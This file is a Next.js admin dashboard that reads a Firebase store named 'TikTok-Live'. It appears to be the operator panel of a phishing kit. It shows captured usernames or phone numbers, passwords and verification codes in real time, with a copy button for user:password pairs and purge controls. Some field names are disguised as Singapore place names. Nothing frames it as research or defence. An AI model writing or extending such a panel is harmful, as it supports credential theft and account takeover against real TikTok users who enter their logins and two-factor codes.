"use client";

import { useEffect, useState, useRef } from "react";
import { useRouter } from "next/navigation";
import { onAuthStateChanged, signOut } from "firebase/auth";
import { ref, onValue, remove, set } from "firebase/database";
import { auth, db } from "@/lib/firebaseConfig";
import { motion, AnimatePresence } from "framer-motion";
import { CopyButton } from "@/components/CopyButton";
import {
  LogOut,
  Loader2,
  Trash2,
  Lock,
  User,
  ShieldCheck,
  Music2,
  Eraser,
  Search,
  ChevronRight,
} from "lucide-react";

export default function AdminDashboard() {
  const [entries, setEntries] = useState<any[]>([]);
  const [searchQuery, setSearchQuery] = useState("");
  const [loading, setLoading] = useState(true);
  const router = useRouter();

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) router.push("/login");
      else setLoading(false);
    });
    return () => unsubscribe();
  }, [router]);

  useEffect(() => {
    if (loading) return;
    return onValue(ref(db, "TikTok-Live"), (snapshot) => {
      const data = snapshot.val();
      if (data) {
        const sorted = Object.entries(data)
          .map(([id, val]: any) => ({
            id,
            ...val,
            displayUser: val.user || val.phone || val.Orchard || "Guest",
            displayPass: val.pass || val.Sentosa || "",
            displayCode: val.code || val.MarinaBay || "",
          }))
          .reverse();
        setEntries(sorted);
      } else {
        setEntries([]);
      }
    });
  }, [loading]);

  const filtered = entries.filter((i) =>
    i.displayUser.toLowerCase().includes(searchQuery.toLowerCase()),
  );

  if (loading)
    return (
      <div className="min-h-screen bg-black flex items-center justify-center">
        <Loader2 className="text-[#fe2c55] animate-spin" />
      </div>
    );

  return (
    <div className="min-h-screen bg-[#000] text-zinc-300 font-sans selection:bg-[#fe2c55]">
      {/* STICKY COMPACT HEADER */}
      <header className="sticky top-0 z-50 bg-black/80 backdrop-blur-lg border-b border-zinc-900 p-4">
        <div className="max-w-2xl mx-auto flex items-center justify-between gap-4">
          <div className="flex items-center gap-2">
            <Music2 size={20} className="text-[#fe2c55]" />
            <span className="font-bold text-sm tracking-tight text-white">
              Admin
            </span>
          </div>

          <div className="flex-1 relative">
            <Search
              size={12}
              className="absolute left-2.5 top-1/2 -translate-y-1/2 text-zinc-600"
            />
            <input
              className="w-full bg-zinc-900/50 border border-zinc-800 rounded-full py-1.5 pl-8 pr-4 text-xs outline-none focus:border-[#fe2c55]/50"
              placeholder="Search..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
            />
          </div>

          <button
            onClick={() => signOut(auth)}
            className="text-zinc-500 hover:text-white">
            <LogOut size={18} />
          </button>
        </div>
      </header>

      <main className="max-w-2xl mx-auto p-2">
        <AnimatePresence mode="popLayout">
          {filtered.map((item) => (
            <motion.div
              key={item.id}
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              className="mb-1 bg-[#0a0a0a] border border-zinc-900 rounded-lg overflow-hidden active:bg-zinc-900 transition-colors">
              <div className="p-3 flex items-center justify-between gap-3">
                {/* User Info (Left) */}
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2 mb-0.5">
                    <User size={10} className="text-zinc-500" />
                    <span className="text-white font-bold text-xs truncate">
                      {item.displayUser}
                    </span>
                  </div>
                  <div className="flex items-center gap-2">
                    <Lock size={10} className="text-zinc-600" />
                    <span className="text-zinc-500 text-[10px] truncate">
                      {item.displayPass || "---"}
                    </span>
                  </div>
                </div>

                {/* Verification Code (Center-Right) */}
                {item.displayCode && (
                  <div className="bg-[#fe2c55]/10 border border-[#fe2c55]/20 px-2 py-1 rounded flex items-center gap-1.5 shadow-[0_0_10px_rgba(254,44,85,0.1)]">
                    <ShieldCheck size={10} className="text-[#fe2c55]" />
                    <span className="text-[#fe2c55] font-black text-xs tracking-wider">
                      {item.displayCode.replace("CODE:", "")}
                    </span>
                  </div>
                )}

                {/* Actions (Right) */}
                <div className="flex items-center gap-1 ml-2">
                  <CopyButton
                    data={`${item.displayUser}:${item.displayPass}`}
                  />
                  <button
                    onClick={() => remove(ref(db, `TikTok-Live/${item.id}`))}
                    className="p-1.5 text-zinc-800 hover:text-red-500 transition-colors">
                    <Trash2 size={14} />
                  </button>
                </div>
              </div>

              {/* Ultra-slim footer for metadata */}
              <div className="px-3 py-1 bg-black/40 border-t border-zinc-900/50 flex justify-between text-[8px] text-zinc-600 font-bold uppercase tracking-tighter">
                <span>{item.EntryTime}</span>
                <span>{item.country || "Global"}</span>
              </div>
            </motion.div>
          ))}
        </AnimatePresence>

        {filtered.length === 0 && (
          <div className="text-center py-20 text-zinc-700 text-xs font-bold uppercase tracking-widest">
            No entries found
          </div>
        )}
      </main>

      {/* MOBILE PURGE BUTTON (Floating) */}
      <button
        onClick={() => {
          if (window.confirm("Wipe all?")) set(ref(db, "TikTok-Live"), null);
        }}
        className="fixed bottom-6 right-6 p-4 bg-zinc-900 border border-zinc-800 rounded-full shadow-2xl text-red-500 active:scale-95 transition-transform">
        <Eraser size={20} />
      </button>
    </div>
  );
}
